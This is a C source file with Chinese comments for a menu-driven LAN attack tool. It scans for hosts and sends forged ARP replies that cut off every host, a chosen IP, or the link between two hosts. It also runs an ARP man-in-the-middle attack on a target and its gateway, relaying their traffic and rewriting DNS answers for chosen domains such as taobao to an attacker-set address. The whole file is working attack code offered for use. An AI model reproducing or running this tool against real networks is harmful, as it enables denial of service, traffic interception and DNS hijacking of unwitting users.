/*===============================================================
*   Copyright (C) 2017 All rights reserved.
*   
*   文件名称：function.c
*   创 建 者：陈迪林
*   创建日期：2017年07月26日
*   描    述：
*
*   更新日志：
*
================================================================*/
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <pthread.h>

#include "socket.h"

unsigned char cheat_mac[6] = {0x0f,0x0f,0x29,0x34,0x4d,0xef};

int one()
{
	int ip[255]={0};
	unsigned char mac[255][6];
	int size;
	int i;
	struct in_addr inaddr;
	printf("查找主机中.....\n");
	if(-1 == find_host(mac, ip, &size))
		return -1;
	for(i=0;i<size;i++)
	{
		inaddr.s_addr = ip[i];
		char *p =  inet_ntoa(inaddr);
		if(mac[i][0] == 0x00 && mac[i][1] == 0x0c && mac[i][2] == 0x29)
			printf("%s -> %02x:%02x:%02x:%02x:%02x:%02x  Vmware mac address.\n", p, mac[i][0], mac[i][1], mac[i][2], mac[i][3], mac[i][4], mac[i][5]);
		else
			printf("%s -> %02x:%02x:%02x:%02x:%02x:%02x\n", p, mac[i][0], mac[i][1], mac[i][2], mac[i][3], mac[i][4], mac[i][5]);
	}
	printf("发现%d台主机.\n",size);
}

int two()
{
	printf("[1]局域网所有主机断网.\n");
	printf("[2]指定IP断网.\n");
	printf("[3]断开两台主机..\n");
	printf(".................................  ");
	printf("选择功能:");
	int option;
	scanf("%d",&option);
	if(option == 1)
	{			
		int ip[255]={0};
		unsigned char mac[255][6];
		int size;
		if(-1 == find_host(mac, ip, &size))
			return -1;
		int i;
		int gateway = getgateway();
		ARPFRAME arpdat;
		int cnt = 0;
		while(1)
		{		
			for(i=0;i<size;i++)
			{
				fill_arp_frame(&arpdat, 2, &mac[i][0], cheat_mac, gateway, ip[i]);
				send_data(&arpdat, sizeof arpdat);
				usleep(200000); /* delay 100ms */
			}
			cnt += size;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else if(option == 2)
	{
		char p[20];
		unsigned char mac[6];
		printf("...................................  ");
		printf("目标ip:");
		scanf("%s",p);
		int i;
		int dstip = inet_addr(p);
		if(-1 == getmacbyip(p,mac))
			return -1;
		
		int gateway = getgateway();
		
		ARPFRAME arpdat;
		fill_arp_frame(&arpdat, 2, mac, cheat_mac, gateway, dstip);
		int cnt = 0;
		while(1)
		{	
			send_data(&arpdat, sizeof arpdat);
			usleep(1000000);
			cnt++;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else if(option == 3)
	{
		char p[20];
		unsigned char mac[6];
		printf("...................................  ");
		printf("目标IP1:");
		scanf("%s",p);
		int srcip = inet_addr(p);
		printf("...................................  ");
		printf("目标IP2:");
		scanf("%s",p);
		int i;
		int dstip = inet_addr(p);
		if(-1 == getmacbyip(p,mac))
			return -1;
		
		ARPFRAME arpdat;
		fill_arp_frame(&arpdat, 2, mac, cheat_mac, srcip, dstip);
		int cnt = 0;
		while(1)
		{	
			send_data(&arpdat, sizeof arpdat);
			usleep(1000000);
			cnt++;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else
	{
		printf("输入错误.\n");
	}
}

static void *p_send_data(void *data)
{
	int send_sock;
	if((send_sock=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("send creat error");
		return NULL;
	}

	struct sockaddr_ll toaddr;
	struct ifreq ifr;
	bzero(&toaddr,sizeof(toaddr));
	bzero(&ifr,sizeof(ifr));
	strcpy(ifr.ifr_name, IF_NAME); /*用于获取IF_NAME网卡索引*/

	if(-1 == ioctl(send_sock,SIOCGIFINDEX,&ifr))/**/
	{
		perror("get dev index error");
		return NULL;
	}
	toaddr.sll_ifindex = ifr.ifr_ifindex; /* 网卡索引 发送和接收数据时需要用到网卡的索引 */
	toaddr.sll_family = PF_PACKET; /* 获取数据链路层数据 */

	while(1)
	{
		/* 发送构造好的以太网数据帧 广播每台主机 */
		if(42 != sendto(send_sock, data, 42, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
		{
			perror("send error");
			return NULL;
		}
		usleep(4000000);
	}

	close(send_sock);
}

int three()
{	
	char target_ip[20]={0};
	printf("...................................  ");
	printf("目标IP:");
	scanf("%s",target_ip);
	int dstip = inet_addr(target_ip);
	// unsigned char *dst_host = (unsigned char *)&dstip;
	unsigned char localmac[6],dstmac[6],gatewaymac[6];

	getlocalmac(localmac);

	int gateway = getgateway();
    struct in_addr inaddr;
    inaddr.s_addr = gateway;
    char *gateway_ip = inet_ntoa(inaddr); /* 获得网关MAC地址 */

	if(-1 == getmacbyip(target_ip,dstmac))
		return -1;
	if(-1 == getmacbyip(gateway_ip,gatewaymac))
		return -1;
	
    ARPFRAME arpdat,arpdat2;
    
	fill_arp_frame(&arpdat2, 2, gatewaymac, localmac, dstip, gateway);/* 欺骗网关 */
	fill_arp_frame(&arpdat, 2, dstmac, localmac, gateway, dstip);/* 欺骗目标主机 */
	
	int sock;	
	if((sock=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
			perror("socket create error");
			return -1;
	}

	struct sockaddr_ll toaddr;
	struct ifreq ifr;
	bzero(&toaddr,sizeof(toaddr));
	bzero(&ifr,sizeof(ifr));
	strcpy(ifr.ifr_name, IF_NAME); /*用于获取IF_NAME网卡索引*/

	if(-1 == ioctl(sock,SIOCGIFINDEX,&ifr))/**/
	{
		perror("get dev index error");
		return -1;
	}
	toaddr.sll_ifindex = ifr.ifr_ifindex; /* 网卡索引 发送和接收数据时需要用到网卡的索引 */
	toaddr.sll_family = PF_PACKET; /* 获取数据链路层数据 */

	unsigned char recv_buff[5000];
	pthread_t t,t1;
	pthread_create(&t, NULL, p_send_data, &arpdat); /* 开启一个线程用于dsthost欺骗 */
	pthread_create(&t1, NULL, p_send_data, &arpdat2); /* 开启一个线程用于gateway欺骗 */

    u16 _arp;
    u16 _ipv4;
    u16 _dns_port;
    _ipv4 = htons(ipv4_prot);
    _arp = htons(arp_prot);
    _dns_port = htons(dns);
    
    int send_enable = 1;
    char *Hdn[100] = {"taobao", NULL, "bdimg", "bdstatic", NULL};
    //char *Hdn[100] = {"baidu", "bdimg", "bdstatic", NULL};
    u8 DNS_response_pack[1000]={0};
	while(1)
	{
		int recv_size = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
        
        ip_datagram *ip = (ip_datagram *)recv_buff;
        
        /* 收到目标主机发送至网关的数据帧 */
        if(ip->iphdr.srcip == dstip)
        {
	        if(ip->ethhdr.type == _ipv4)/* 只转发ip协议数据 */
	        {
                memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中源mac地址为本机mac，目标mac为网关mac */
                memcpy(ip->ethhdr.src,localmac,6);
                if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
                {
                    perror("send error");
                } 
	        }
        }
        
        /* 收到网关发送至目标主机的数据帧 */
        if(ip->iphdr.dstip == dstip)
        {
            if(ip->ethhdr.type == _ipv4)
	        {
                if(ip->iphdr.protocol == udp_prot) /* UDP */
                {
                    udp_datagram *udp = (udp_datagram *)recv_buff;
                    if(udp->udphdr.srcport == _dns_port) /* DNS服务 */
                    {
                    	/* 解析主机访问的域名 */
                        char domain[100] = {0};
                        dns_datagram *dnsframe = (dns_datagram *)recv_buff;
                        int length_1 = (int)dnsframe->domain[0];
                        char *p = dnsframe->domain;
                        p = p + 1 + length_1;
                        int length_2 = (int)*p;
                        p++;
                        memcpy(domain, p, length_2);
                        printf("%s\n",domain);
                        
                        /* 计算问题数用总字节数 */
                        p = dnsframe->domain;
                        int question_length = 0;
                        while(*p != 0)
                        {
                            question_length += 1;
                            p++;
                        }

                        question_length += 5;/*0x00 1byte 查询类型 查询类 4byte */
                        
                        //printf("totallength=%d\n", question_length);
                        
                        int answernum = ntohs(dnsframe->answer_rrs);
                        //printf("*******answer num: %d*******\n",answernum);
                        
                        int i = 0;
                        while(Hdn[i] != NULL)
                        {
                        	if(0 == strcmp(domain, Hdn[i])) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
                        	{
                                //change ipaddr
                                u8 *answer_c = (u8 *)(dnsframe->domain+question_length);
                        		while(answernum)
                                {
                                    answernum--;
                                    dns_answer *answer = (dns_answer *)answer_c;
                                    if(answer->type == htons(0x0001))/* 若响应类型是IPV4地址，则更改 */
                                    {
                                        answer->ipaddr = inet_addr("192.168.1.109");
                                    }
                                    answer_c = answer_c + 12 + ntohs(answer->datalength);
                                }
                                //change udp_check_sum
                                //wei header
                                udp_whdr whdr;
                                memset(&whdr, 0xaa, sizeof(whdr));
                                whdr.srcip = ip->iphdr.srcip;
                                whdr.dstip = ip->iphdr.dstip;
                                whdr.zero = 0;
                                whdr.protocol = 0x11;
                                whdr.length = htons(recv_size-sizeof(ip_datagram));

                                //udp header
                                //printf("hdsize:%ld\n",sizeof(udp_header));
                                memcpy(&(whdr.udphdr.srcport), &(dnsframe->udphdr.srcport), sizeof(udp_header));
                                //udp_data
                                //printf("datasize:%d\n",recv_size-sizeof(udp_datagram));
                                memcpy(whdr.udpdata, &(dnsframe->transactionid), recv_size-sizeof(udp_datagram));
                                //printf("recv_size:%d\n",recv_size);
                                int y = 0;
                                

                                // s = (u8 *)whdr.udphdr;
                                // for(y=0;y<50;y++)
                                // {
                                // 	printf("%02x ",*s);fflush(stdout);
                                // 	s++;
                                // 	if(y%16==0) printf("\n");
                                // }
                                whdr.udphdr.check_sum = 0;
                                dnsframe->udphdr.check_sum = 0;

                                // u8 *s = (u8 *)&(whdr.srcip);
                                // for(;y<100;y++)
                                // {
                                // 	if(y%16==0) printf("\n");
                                // 	printf("%02x ",*s);fflush(stdout);
                                // 	s++;
                                // }
                                //printf("checksize:%d\n",recv_size-sizeof(ip_datagram));
                                dnsframe->udphdr.check_sum = check_sum((u16 *)&whdr,\
                                recv_size-sizeof(ip_datagram) + 12); // 12 is weihdr size
                                //printf("check:%04x\n",dnsframe->udphdr.check_sum);
                                break;
                        	}
                        	i++;
                        }
                    }
                }
	        }   
            memcpy(ip->ethhdr.dst,dstmac,6);
            memcpy(ip->ethhdr.src,localmac,6);
            if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
            {
                perror("send error");
            } 
        }
        
    }
}


int four()
{
	char target_ip[20]={0};
	printf("...................................  ");
	printf("目标IP:");
	scanf("%s",target_ip);
	int dstip = inet_addr(target_ip);

	int ip[255]={0};
	unsigned char mac[255][6];
	int size;
	if(-1 == find_host(mac, ip, &size))
			return -1;
	int i;

	ARPFRAME arpdat;
	int cnt = 0;
	while(1)
	{		
		for(i=0;i<size;i++)
		{
			fill_arp_frame(&arpdat, 2, &mac[i][0], cheat_mac, dstip, ip[i]);
			send_data(&arpdat, sizeof arpdat);
			usleep(200000); /* delay 100ms */
		}
		cnt += size;
		printf(">发送第%d个欺骗数据包.\n",cnt);
	}
}



